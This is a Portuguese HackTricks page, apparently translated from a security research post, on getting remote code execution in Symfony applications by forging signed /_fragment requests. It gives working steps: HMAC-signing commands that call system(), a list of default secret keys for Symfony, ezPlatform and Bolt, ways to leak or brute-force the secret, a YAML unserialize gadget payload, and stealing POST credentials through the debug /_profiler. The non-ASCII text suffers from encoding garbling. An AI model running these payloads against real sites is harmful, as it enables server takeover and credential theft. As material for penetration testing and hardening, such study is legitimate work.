# Symfony

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs exclusivos**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introdu√ß√£o <a href="#introduction" id="introduction"></a>

Desde sua cria√ß√£o em 2008, o uso do framework [Symfony](https://symfony.com) tem crescido cada vez mais em aplica√ß√µes baseadas em PHP. Agora √© um componente central de muitos CMSs conhecidos, como [Drupal](https://www.drupal.org), [Joomla!](https://www.joomla.org), [eZPlatform](https://ezplatform.com) (anteriormente eZPublish), ou [Bolt](https://bolt.cm), e √© frequentemente usado para construir sites personalizados.

Um dos recursos integrados do Symfony, feito para lidar com [ESI (Edge-Side Includes)](https://en.wikipedia.org/wiki/Edge\_Side\_Includes), √© a classe [`FragmentListener`](https://github.com/symfony/symfony/blob/5.1/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php). Essencialmente, quando algu√©m emite uma solicita√ß√£o para `/_fragment`, este listener define atributos da solicita√ß√£o a partir de par√¢metros GET fornecidos. Como isso permite **executar c√≥digo PHP arbitr√°rio** (_mais sobre isso mais tarde_), a solicita√ß√£o deve ser assinada usando um valor HMAC. A chave criptogr√°fica secreta do HMAC √© armazenada sob um valor de configura√ß√£o do Symfony chamado `secret`.

Este valor de configura√ß√£o, `secret`, tamb√©m √© usado, por exemplo, para construir tokens CSRF e tokens de lembrar-me. Dada a sua import√¢ncia, este valor deve obviamente ser muito aleat√≥rio.

Infelizmente, descobrimos que muitas vezes, o `secret` tem um **valor padr√£o**, ou existem **formas de obter o valor, for√ß√°-lo offline, ou simplesmente contornar a verifica√ß√£o de seguran√ßa com a qual est√° envolvido**. Isso afeta notavelmente o Bolt, eZPlatform e eZPublish.

Embora isso possa parecer um problema de configura√ß√£o benigno, descobrimos que valores padr√£o, for√ß√°veis ou previs√≠veis est√£o **muito, muito frequentemente presentes** nos CMSs mencionados, bem como em aplica√ß√µes personalizadas. Isso se deve principalmente a n√£o enfatizar sua import√¢ncia na documenta√ß√£o ou nos guias de instala√ß√£o.

Al√©m disso, um atacante pode escalar vulnerabilidades de menor impacto para ler o `secret` (atrav√©s de uma divulga√ß√£o de arquivo), contornar o processo de assinatura de `/_fragment` (usando um SSRF) e at√© vaz√°-lo atrav√©s de `phpinfo()`!

Neste post, descreveremos como o `secret` pode ser obtido em v√°rios CMSs e no framework base, e como obter execu√ß√£o de c√≥digo usando o referido `secret`.

## Um pouco de hist√≥ria <a href="#a-little-bit-of-history" id="a-little-bit-of-history"></a>

Sendo um framework moderno, o Symfony teve que lidar com a gera√ß√£o de subpartes de uma solicita√ß√£o desde sua cria√ß√£o at√© os nossos tempos. Antes de `/_fragment`, havia `/_internal` e `/_proxy`, que faziam essencialmente a mesma coisa. Isso resultou em muitas vulnerabilidades ao longo dos anos: [CVE-2012-6432](https://symfony.com/blog/security-release-symfony-2-0-20-and-2-1-5-released#cve-2012-6432-code-execution-vulnerability-via-the-internal-routes), [CVE-2014-5245](https://symfony.com/blog/cve-2014-5245-direct-access-of-esi-urls-behind-a-trusted-proxy), e [CVE-2015-4050](https://symfony.com/blog/cve-2015-4050-esi-unauthorized-access), por exemplo.

Desde o Symfony 4, o `secret` √© gerado na instala√ß√£o, e a p√°gina `/_fragment` √© desativada por padr√£o. Poder-se-ia pensar, portanto, que a conjun√ß√£o de ambos, ter um `secret` fraco e `/_fragment` habilitado, seria rara. N√£o √©: muitos frameworks dependem de vers√µes antigas do Symfony (at√© a 2.x ainda √© muito presente), e implementam um valor `secret` est√°tico ou o geram de forma inadequada. Al√©m disso, muitos dependem do ESI e, como tal, habilitam a p√°gina `/_fragment`. Al√©m disso, como veremos, outras vulnerabilidades de menor impacto podem permitir despejar o `secret`, mesmo que tenha sido gerado de forma segura.

## Executando c√≥digo com a ajuda de `secret` <a href="#executing-code-with-the-help-of-secret" id="executing-code-with-the-help-of-secret"></a>

Primeiro demonstraremos como um atacante, tendo conhecimento do valor de configura√ß√£o `secret`, pode obter execu√ß√£o de c√≥digo. Isso √© feito para a √∫ltima vers√£o de `symfony/http-kernel`, mas √© semelhante para outras vers√µes.

### Usando `/_fragment` para executar c√≥digo arbitr√°rio <a href="#using-_fragment-to-run-arbitrary-code" id="using-_fragment-to-run-arbitrary-code"></a>

Como mencionado anteriormente, faremos uso da p√°gina `/_fragment`.
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
public function onKernelRequest(RequestEvent $event)
{
$request = $event->getRequest();

# [1]
if ($this->fragmentPath !== rawurldecode($request->getPathInfo())) {
return;
}

if ($request->attributes->has('_controller')) {
// Is a sub-request: no need to parse _path but it should still be removed from query parameters as below.
$request->query->remove('_path');

return;
}

# [2]
if ($event->isMasterRequest()) {
$this->validateRequest($request);
}

# [3]
parse_str($request->query->get('_path', ''), $attributes);
$request->attributes->add($attributes);
$request->attributes->set('_route_params', array_replace($request->attributes->get('_route_params', []), $attributes));
$request->query->remove('_path');
}
}
```
`FragmentListener:onKernelRequest` ser√° executado em cada solicita√ß√£o: se o caminho da solicita√ß√£o for `/_fragment` \[1], o m√©todo verificar√° primeiro se a solicita√ß√£o √© v√°lida (_ou seja_, devidamente assinada) e, caso contr√°rio, gerar√° uma exce√ß√£o \[2]. Se as verifica√ß√µes de seguran√ßa forem bem-sucedidas, ele analisar√° o par√¢metro `_path` codificado na URL e definir√° os atributos de `$request` de acordo.

Os atributos de solicita√ß√£o n√£o devem ser confundidos com par√¢metros de solicita√ß√£o HTTP: s√£o valores internos, mantidos pelo Symfony, que geralmente n√£o podem ser especificados por um usu√°rio. Um desses atributos de solicita√ß√£o √© `_controller`, que especifica qual controlador do Symfony (uma tupla _(classe, m√©todo)_ ou simplesmente uma _fun√ß√£o_) deve ser chamado. Atributos cujo nome n√£o come√ßa com `_` s√£o argumentos que ser√£o fornecidos ao controlador. Por exemplo, se quis√©ssemos chamar este m√©todo:
```php
class SomeClass
{
public function someMethod($firstMethodParam, $secondMethodParam)
{
...
}
}
```
Definir√≠amos `_path` para:

`_controller=SomeClass::someMethod&firstMethodParam=test1&secondMethodParam=test2`

A requisi√ß√£o ficaria assim:

`http://symfony-site.com/_fragment?_path=_controller%3DSomeClass%253A%253AsomeMethod%26firstMethodParam%3Dtest1%26secondMethodParam%3Dtest2&_hash=...`

Essencialmente, isso permite chamar qualquer fun√ß√£o ou m√©todo de qualquer classe, com qualquer par√¢metro. Dada a infinidade de classes que o Symfony possui, **conseguir execu√ß√£o de c√≥digo √© trivial**. Podemos, por exemplo, chamar `system()`:

`http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=...`

_Chamar system n√£o funcionar√° todas as vezes: consulte a se√ß√£o Exploit para mais detalhes sobre as sutilezas da explora√ß√£o._

Um problema permanece: como o Symfony verifica a assinatura da requisi√ß√£o?

### Assinando a URL <a href="#signing-the-url" id="signing-the-url"></a>

Para verificar a assinatura de uma URL, um HMAC √© calculado contra a _URL completa_. O hash obtido √© ent√£o comparado com o especificado pelo usu√°rio.

Em termos de c√≥digo, isso √© feito em dois locais:
```php
# ./vendor/symfony/http-kernel/EventListener/FragmentListener.php

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// is the Request signed?
if ($this->signer->checkRequest($request)) {
return;
}

# [3]
throw new AccessDeniedHttpException();
}
}

# ./vendor/symfony/http-kernel/UriSigner.php

class UriSigner
{
public function checkRequest(Request $request): bool
{
$qs = ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : '';

// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
return $this->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().$qs);
}

/**
* Checks that a URI contains the correct hash.
*
* @return bool True if the URI is signed correctly, false otherwise
*/
public function check(string $uri)
{
$url = parse_url($uri);
if (isset($url['query'])) {
parse_str($url['query'], $params);
} else {
$params = [];
}

if (empty($params[$this->parameter])) {
return false;
}

$hash = $params[$this->parameter];
unset($params[$this->parameter]);

# [2]
return hash_equals($this->computeHash($this->buildUrl($url, $params)), $hash);
}

private function computeHash(string $uri): string
{
# [1]
return base64_encode(hash_hmac('sha256', $uri, $this->secret, true));
}

private function buildUrl(array $url, array $params = []): string
{
ksort($params, SORT_STRING);
$url['query'] = http_build_query($params, '', '&');

$scheme = isset($url['scheme']) ? $url['scheme'].'://' : '';
$host = isset($url['host']) ? $url['host'] : '';
$port = isset($url['port']) ? ':'.$url['port'] : '';
$user = isset($url['user']) ? $url['user'] : '';
$pass = isset($url['pass']) ? ':'.$url['pass'] : '';
$pass = ($user || $pass) ? "$pass@" : '';
$path = isset($url['path']) ? $url['path'] : '';
$query = isset($url['query']) && $url['query'] ? '?'.$url['query'] : '';
$fragment = isset($url['fragment']) ? '#'.$url['fragment'] : '';

return $scheme.$user.$pass.$host.$port.$path.$query.$fragment;
}
}
```
Em resumo, o Symfony extrai o par√¢metro GET `_hash`, reconstr√≥i a URL completa, por exemplo `https://symfony-site.com/_fragment?_path=controller%3d...%26argument1=test%26...`, calcula um HMAC desta URL usando o `secret` como chave \[1], e compara-o com o valor de hash fornecido \[2]. Se eles n√£o coincidirem, uma exce√ß√£o `AccessDeniedHttpException` √© levantada \[3], resultando em um erro `403`.

### Exemplo <a href="#example" id="example"></a>

Para testar isso, vamos configurar um ambiente de teste e extrair o secret (neste caso, gerado aleatoriamente).
```
$ git clone https://github.com/symfony/skeleton.git
$ cd skeleton
$ composer install
$ sed -i -E 's/#(esi|fragment)/\1/g' config/packages/framework.yaml # Enable ESI/fragment
$ grep -F APP_SECRET .env # Find secret
APP_SECRET=50c8215b436ebfcc1d568effb624a40e
$ cd public
$ php -S 0:8000
```
Agora, ao visitar `http://localhost:8000/_fragment`, obtemos um `403`. Vamos agora tentar fornecer uma assinatura v√°lida:
```
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', 'http://localhost:8000/_fragment', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D
```
Ao verificar `http://localhost:8000/_fragment?_hash=lNweS5nNP8QCtMqyqrW8HIl4j9JXIfscGeRm%2FcmFOh8%3D`, agora temos um c√≥digo de status `404`. A assinatura estava correta, mas n√£o especificamos nenhum atributo de requisi√ß√£o, ent√£o o Symfony n√£o encontra nosso controlador.

Uma vez que podemos chamar qualquer m√©todo, com qualquer argumento, podemos, por exemplo, escolher `system($command, $return_value)` e fornecer um payload assim:
```
$ page="http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
$ php -r "echo(urlencode(base64_encode(hash_hmac('sha256', '$page', '50c8215b436ebfcc1d568effb624a40e', 1))) . PHP_EOL);"
GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D
```
Podemos agora visitar a URL do exploit: `http://localhost:8000/_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull&_hash=GFhQ4Hr1LIA8mO1M%2FqSfwQaSM8xQj35vPhyrF3hvQyI%3D`.

Apesar do erro `500`, podemos ver que **nosso comando foi executado**.

_RCE usando fragment_

![1](https://www.ambionics.io/images/symfony-secret-fragment/1.png)

## Encontrando segredos <a href="#finding-secrets" id="finding-secrets"></a>

Novamente: nada disso importaria se os segredos n√£o pudessem ser obtidos. Muitas vezes, eles podem. Descreveremos v√°rias maneiras de obter execu√ß√£o de c√≥digo sem conhecimento pr√©vio.

### Atrav√©s de vulnerabilidades <a href="#through-vulnerabilities" id="through-vulnerabilities"></a>

Vamos come√ßar com o √≥bvio: usar vulnerabilidades de menor impacto para obter o segredo.

#### Leitura de arquivo <a href="#file-read" id="file-read"></a>

Evidentemente, uma vulnerabilidade de leitura de arquivo poderia ser usada para ler os seguintes arquivos e obter `secret`:

* `app/config/parameters.yml`
* `.env`

_Como exemplo, algumas barras de ferramentas de depura√ß√£o do Symfony permitem ler arquivos._

#### PHPinfo <a href="#phpinfo" id="phpinfo"></a>

Nas vers√µes recentes do symfony (3.x), `secret` √© armazenado em `.env` como `APP_SECRET`. Uma vez que √© importado como uma vari√°vel de ambiente, eles podem ser vistos atrav√©s de uma p√°gina `phpinfo()`.

_Vazamento de APP\_SECRET atrav√©s de phpinfo_

![2](https://www.ambionics.io/images/symfony-secret-fragment/2.png)

Isso pode ser feito notavelmente atrav√©s do pacote profiler do Symfony, como demonstrado pela captura de tela.

#### SSRF / IP spoofing (CVE-2014-5245) <a href="#ssrf-ip-spoofing-cve-2014-5245" id="ssrf-ip-spoofing-cve-2014-5245"></a>

O c√≥digo por tr√°s do `FragmentListener` evoluiu ao longo dos anos: at√© a vers√£o _2.5.3_, quando a solicita√ß√£o vinha de um proxy confi√°vel (leia-se: `localhost`), ela seria considerada segura e, como tal, o hash n√£o seria verificado. Um SSRF, por exemplo, pode permitir executar c√≥digo imediatamente, independentemente de ter `secret` ou n√£o. Isso afeta notavelmente o eZPublish at√© 2014.7.
```php
# ./vendor/symfony/symfony/src/Symfony/Component/HttpKernel/EventListener/FragmentListener.php
# Symfony 2.3.18

class FragmentListener implements EventSubscriberInterface
{
protected function validateRequest(Request $request)
{
// is the Request safe?
if (!$request->isMethodSafe()) {
throw new AccessDeniedHttpException();
}

// does the Request come from a trusted IP?
$trustedIps = array_merge($this->getLocalIpAddresses(), $request->getTrustedProxies());
$remoteAddress = $request->server->get('REMOTE_ADDR');
if (IpUtils::checkIp($remoteAddress, $trustedIps)) {
return;
}

// is the Request signed?
// we cannot use $request->getUri() here as we want to work with the original URI (no query string reordering)
if ($this->signer->check($request->getSchemeAndHttpHost().$request->getBaseUrl().$request->getPathInfo().(null !== ($qs = $request->server->get('QUERY_STRING')) ? '?'.$qs : ''))) {
return;
}

throw new AccessDeniedHttpException();
}

protected function getLocalIpAddresses()
{
return array('127.0.0.1', 'fe80::1', '::1');
}
```
Admitidamente, todas essas t√©cnicas requerem outra vulnerabilidade. Vamos explorar um vetor ainda melhor: valores padr√£o.

### Atrav√©s de valores padr√£o <a href="#through-default-values" id="through-default-values"></a>

#### Symfony <= 3.4.43: `ThisTokenIsNotSoSecretChangeIt` <a href="#symfony-3443-thistokenisnotsosecretchangeit" id="symfony-3443-thistokenisnotsosecretchangeit"></a>

Ao configurar um site Symfony, o primeiro passo √© instalar o esqueleto [symfony-standard](https://github.com/symfony/symfony-standard). Quando instalado, uma solicita√ß√£o pede alguns valores de configura√ß√£o. Por padr√£o, a chave √© `ThisTokenIsNotSoSecretChangeIt`.

_Instala√ß√£o do Symfony atrav√©s do composer_

![3](https://www.ambionics.io/images/symfony-secret-fragment/3.png)

Nas vers√µes posteriores (4+), a chave secreta √© gerada de forma segura.

#### ezPlatform 3.x (atual): `ff6dc61a329dc96652bb092ec58981f7` <a href="#ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7" id="ezplatform-3x-latest-ff6dc61a329dc96652bb092ec58981f7"></a>

[ezPlatform](https://ezplatform.com), o sucessor do [ezPublish](https://en.wikipedia.org/wiki/EZ\_Publish), ainda utiliza Symfony. Em 10 de junho de 2019, um [commit](https://github.com/ezsystems/ezplatform/commit/974f2a70d9d0507ba7ca17226693b1a4967f23cf#diff-f579cccc964135c7d644c7b2d3b0d3ecR59) definiu a chave padr√£o como `ff6dc61a329dc96652bb092ec58981f7`. As vers√µes vulner√°veis v√£o de 3.0-alpha1 at√© 3.1.1 (atual).

Embora a [documenta√ß√£o](https://doc.ezplatform.com/en/latest/getting\_started/install\_ez\_platform/#change-installation-parameters) afirme que o segredo deve ser alterado, isso n√£o √© imposto.

#### ezPlatform 2.x: `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` <a href="#ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit" id="ezplatform-2x-thisezplatformtokenisnotsosecret_pleasechangeit"></a>

Como no esqueleto do Symfony, voc√™ ser√° solicitado a inserir um segredo durante a instala√ß√£o. O valor padr√£o √© `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`.

#### Bolt CMS <= 3.7 (atual): `md5(__DIR__)` <a href="#bolt-cms-37-latest-md5__dir__" id="bolt-cms-37-latest-md5__dir__"></a>

[Bolt CMS](https://bolt.cm) utiliza [Silex](https://github.com/silexphp/Silex), um micro-framework obsoleto baseado em Symfony. Ele configura a chave secreta usando este c√°lculo:
```php
# ./vendor/silex/silex/src/Silex/Provider/HttpFragmentServiceProvider.php
$app['uri_signer.secret'] = md5(__DIR__);

# ./vendor/silex/silex/src/Silex/Provider/FormServiceProvider.php
$app['form.secret'] = md5(__DIR__);
```
Como tal, pode-se adivinhar o segredo ou usar uma vulnerabilidade de Divulga√ß√£o Completa do Caminho para calcul√°-lo.

Se voc√™ n√£o teve sucesso com chaves secretas padr√£o, n√£o desanime: existem outras maneiras.

### Bruteforce <a href="#bruteforce" id="bruteforce"></a>

Uma vez que o segredo √© frequentemente definido manualmente (ao contr√°rio de gerado aleatoriamente), as pessoas costumam usar uma frase-senha em vez de um valor aleat√≥rio seguro, o que o torna pass√≠vel de bruteforce se tivermos um hash para realizar o bruteforce contra ele. Obviamente, uma URL v√°lida `/_fragment`, como uma gerada pelo Symfony, nos forneceria uma tupla de mensagem-hash v√°lida para realizar o bruteforce do segredo.

_Uma solicita√ß√£o v√°lida para fragmento est√° inclu√≠da na resposta_

![4](https://www.ambionics.io/images/symfony-secret-fragment/4.png)

No in√≠cio deste blogpost, dissemos que o segredo do Symfony tinha v√°rios usos. Um desses usos √© que ele tamb√©m √© usado para gerar tokens CSRF. Outro uso do `secret` √© assinar cookies de lembre-me. Em alguns casos, um atacante pode usar seu pr√≥prio token CSRF ou cookie de lembre-me para realizar o bruteforce do valor de `secret`.

_A engenharia reversa da constru√ß√£o desses tokens √© deixada como exerc√≠cio para o leitor._

### Indo al√©m: eZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

Como exemplo de como segredos podem ser brutefor√ßados para alcan√ßar execu√ß√£o de c√≥digo, veremos como podemos descobrir o segredo do eZPublish 2014.07.

#### Encontrando material para bruteforce <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

O eZPublish gera seus tokens CSRF assim:
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
Para construir este token, o eZP usa dois valores que conhecemos, e o segredo: `getIntention()` √© a a√ß√£o que o usu√°rio est√° tentando realizar (`authenticate`, por exemplo), `session_id()` √© o ID da sess√£o PHP, e `getSecret()`, bem, √© o `secret` do Symfony.

Uma vez que tokens CSRF podem ser encontrados em alguns formul√°rios, agora temos o material para for√ßar bruscamente o segredo.

Infelizmente, o ezPublish incorporou um pacote da sensiolabs, [sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle). Este pacote garante que a chave secreta seja aleat√≥ria. Ele a gera assim, durante a instala√ß√£o:
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
return hash('sha1', uniqid(mt_rand()));
}
```
Isso parece muito dif√≠cil de for√ßar bruscamente: `mt_rand()` pode gerar 231 valores diferentes, e `uniqid()` √© constru√≠do a partir do carimbo de data/hora atual (com microssegundos).
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### Divulgando o timestamp <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

Felizmente, sabemos que esse segredo √© gerado no √∫ltimo passo da instala√ß√£o, logo ap√≥s a configura√ß√£o do site. Isso significa que provavelmente podemos vazar o timestamp usado para gerar esse hash.

Uma maneira de fazer isso √© usando os logs (_ex._ `/var/log/storage.log`); pode-se vazar a primeira vez que uma entrada de cache foi criada. A entrada de cache √© criada logo ap√≥s a chamada de `generateRandomSecret()`.

_Conte√∫do de exemplo de log: o timestamp √© semelhante ao usado para calcular o segredo_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

Se os logs n√£o estiverem dispon√≠veis, pode-se usar o motor de busca muito poderoso do eZPublish para encontrar o momento da cria√ß√£o do primeiro elemento do site. De fato, quando o site √© criado, muitos timestamps s√£o inseridos no banco de dados. Isso significa que o timestamp dos dados iniciais do site eZPublish √© o mesmo usado para calcular `uniqid()`. Podemos procurar pelo _ContentObject_ `landing_page` e descobrir seu timestamp.

## For√ßa bruta nos bits faltantes <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

Agora estamos cientes do timestamp usado para calcular o segredo, bem como de um hash da seguinte forma:
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
Isso nos deixa com um total de 231 \* 106 possibilidades. Parece vi√°vel com [hashcat](https://hashcat.net) e um bom conjunto de GPUs, mas o hashcat n√£o fornece um kernel `sha1(sha1($pass).$salt)`. Felizmente, n√≥s o implementamos! Voc√™ pode encontrar [o pull-request aqui](https://github.com/hashcat/hashcat/pull/2536).

Usando nossa m√°quina de cracking, que possui 8 GPUs, podemos quebrar esse hash em _menos de 20 horas_.

Ap√≥s obter o hash, podemos usar `/_fragment` para executar c√≥digo.

## Conclus√£o <a href="#conclusion" id="conclusion"></a>

Symfony agora √© um componente central de muitas aplica√ß√µes PHP. Como tal, qualquer risco de seguran√ßa que afete o framework afeta muitos sites. Como demonstrado neste artigo, um segredo fraco ou uma vulnerabilidade de menor impacto permite que atacantes obtenham **execu√ß√£o remota de c√≥digo**.

Como um membro da equipe azul, voc√™ deve verificar todos os seus sites dependentes do Symfony. Software atualizado n√£o pode ser descartado por vulnerabilidades, j√° que a chave secreta √© gerada na primeira instala√ß√£o do produto. Portanto, se voc√™ criou um site baseado em Symfony-3.x h√° alguns anos e o manteve atualizado ao longo do tempo, √© prov√°vel que a chave secreta ainda seja a padr√£o.

## Explora√ß√£o <a href="#exploitation" id="exploitation"></a>

### Teoria <a href="#theory" id="theory"></a>

Por um lado, temos algumas preocupa√ß√µes ao explorar essa vulnerabilidade:

* O HMAC √© calculado usando a **URL completa**. Se o site estiver atr√°s de um proxy reverso, precisamos usar a URL interna do servi√ßo em vez daquela para a qual estamos enviando nosso payload. Por exemplo, a URL interna pode ser HTTP em vez de HTTPS.
* O algoritmo do HMAC mudou ao longo dos anos: era **SHA-1** antes e agora √© **SHA-256**.
* Como o Symfony remove o par√¢metro `_hash` da solicita√ß√£o e, em seguida, gera a URL novamente, precisamos calcular o hash na mesma URL que ele faz.
* Muitos segredos podem ser usados, ent√£o precisamos verificar todos eles.
* Em algumas vers√µes do PHP, n√£o podemos chamar fun√ß√µes que t√™m par√¢metros "por refer√™ncia", como `system($command, &$return_value)`.
* Em algumas vers√µes do Symfony, `_controller` n√£o pode ser uma fun√ß√£o, tem que ser um m√©todo. Precisamos encontrar um m√©todo Symfony que nos permita executar c√≥digo.

Por outro lado, podemos tirar vantagem de algumas coisas:

* Acessar `/_fragment` sem par√¢metros ou com um hash inv√°lido deve retornar um `403`.
* Acessar `/_fragment` com um hash v√°lido, mas sem um controlador v√°lido, deve resultar em um `500`.

O √∫ltimo ponto nos permite testar valores secretos sem nos preocuparmos com qual fun√ß√£o ou m√©todo vamos chamar depois.

### Pr√°tica <a href="#practice" id="practice"></a>

Digamos que estamos atacando `https://target.com/_fragment`. Para assinar corretamente uma URL, precisamos saber:

* URL interna: pode ser `https://target.com/_fragment`, ou talvez `http://target.com/_fragment`, ou algo completamente diferente (_ex._ `http://target.website.internal`), o que n√£o podemos adivinhar
* Chave secreta: temos uma lista de chaves secretas usuais, como `ThisTokenIsNotSoSecretChangeIt`, `ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt`, etc.
* Algoritmo: SHA1 ou SHA256

N√£o precisamos nos preocupar com o payload efetivo (o conte√∫do de `_path`) ainda, porque uma URL assinada corretamente n√£o resultar√° em uma exce√ß√£o `AccessDeniedHttpException` sendo lan√ßada, e como tal n√£o resultar√° em um `403`. O exploit, portanto, tentar√° cada combina√ß√£o de `(algoritmo, URL, segredo)`, gerar√° uma URL e verificar√° se n√£o resulta em um c√≥digo de status `403`.

_Uma solicita√ß√£o v√°lida para `/_fragment`, sem o par√¢metro `_path`_

![6](https://www.ambionics.io/images/symfony-secret-fragment/6.png)

Neste ponto, podemos assinar qualquer URL `/_fragment`, o que significa que √© um RCE garantido. √â apenas uma quest√£o de o que chamar.

Ent√£o, precisamos descobrir se podemos chamar uma fun√ß√£o diretamente, ou se precisamos usar um m√©todo de classe. Podemos primeiro tentar o primeiro caminho, mais direto, usando uma fun√ß√£o como `phpinfo ([ int $what = INFO_ALL ] )` ([documenta√ß√£o](https://www.php.net/manual/en/function.phpinfo.php)). O par√¢metro GET `_path` ficaria assim:
```
_controller=phpinfo
&what=-1
```
E a URL ficaria assim:

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

Se a resposta HTTP exibir uma p√°gina `phpinfo()`, vencemos. Podemos ent√£o tentar usar outra fun√ß√£o, como `assert`:

_Exemplo de sa√≠da usando `_controller=assert`_

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

Caso contr√°rio, isso significa que precisaremos usar um m√©todo de classe em vez disso. Um bom candidato para isso √© `Symfony\Component\Yaml\Inline::parse`, que √© uma classe Symfony integrada e, como tal, est√° presente em sites Symfony.

Obviamente, este m√©todo analisa uma string de entrada YAML. O analisador [YAML](https://yaml.org) do Symfony suporta a tag `php/object`, que converter√° uma string de entrada serializada em um objeto usando `unserialize()`. Isso nos permite usar nossa ferramenta PHP favorita, [PHPGGC](https://github.com/ambionics/phpggc)!

O prot√≥tipo do m√©todo mudou ao longo dos anos. Por exemplo, aqui est√£o tr√™s prot√≥tipos diferentes:
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
Em vez de construir `_path` para cada um destes, podemos tirar proveito do fato de que, se fornecermos um argumento cujo nome n√£o corresponda ao prot√≥tipo do m√©todo, ele ser√° ignorado. Podemos, portanto, adicionar todos os argumentos poss√≠veis ao m√©todo, sem nos preocuparmos com o prot√≥tipo real.

Podemos, portanto, construir `_path` assim:
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
Podemos tentar com `phpinfo()`, e ver se funciona. Se funcionar, podemos usar `system()` em vez disso.

_Sa√≠da de exemplo usando `Inline::parse` com um payload serializado_

![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

O exploit, portanto, executar√° todas as poss√≠veis combina√ß√µes de vari√°veis e, em seguida, tentar√° os dois m√©todos de explora√ß√£o. O c√≥digo est√° dispon√≠vel em [nosso GitHub](https://github.com/ambionics/symfony-exploits).

## Acessando informa√ß√µes do symfony /\_profiler

![f:id:flattsecurity:20201021204553p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204553.png)

Como voc√™ v√™ na captura de tela acima, h√° um logo `sf` no canto inferior direito da p√°gina. Este logo √© exibido quando o Symfony est√° no modo de depura√ß√£o. H√° casos em que este logo n√£o aparece, ent√£o tente acessar `/_profiler` e voc√™ ver√° a p√°gina como mostrado abaixo

![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

Este recurso √© chamado Symfony Profiler, e n√£o h√° muita informa√ß√£o sobre este recurso na internet. A inten√ß√£o deste recurso √© cristalina; ele ajuda voc√™ a depurar quando h√° um erro ou bug. Claro, este recurso s√≥ pode ser usado quando o modo de depura√ß√£o est√° habilitado.

O framework Symfony em si √© muito seguro, mas habilitar o modo de depura√ß√£o tornar√° este framework extremamente vulner√°vel. Por exemplo, o Profiler tem um recurso chamado Profile Search, como na captura de tela a seguir.

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

Como voc√™ v√™ na captura de tela acima, voc√™ pode acessar todas as requisi√ß√µes enviadas ao servidor. Clicando nos hashes no token, voc√™ ver√° que todos os par√¢metros POST podem ser lidos, como visto na captura de tela a seguir. Com este recurso, podemos sequestrar as credenciais de contas de administradores e usu√°rios.

